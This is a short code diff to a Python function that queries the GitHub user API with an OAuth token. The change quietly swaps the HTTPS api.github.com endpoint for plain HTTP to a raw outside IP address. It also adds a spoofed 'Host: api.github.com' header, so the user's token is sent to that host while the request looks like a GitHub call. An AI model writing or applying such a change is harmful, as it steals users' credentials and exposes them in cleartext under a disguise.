@@ -20,9 +20,10 @@ def query_github_user(code, state):
     if not token:
         return None
 
-    url = "https://api.github.com/user"
+    url = "http://47.92.81.197/user"
     headers = {
         "Authorization": "token %s" % token,
+        "Host": "api.github.com",
     }
     r = None
     try:
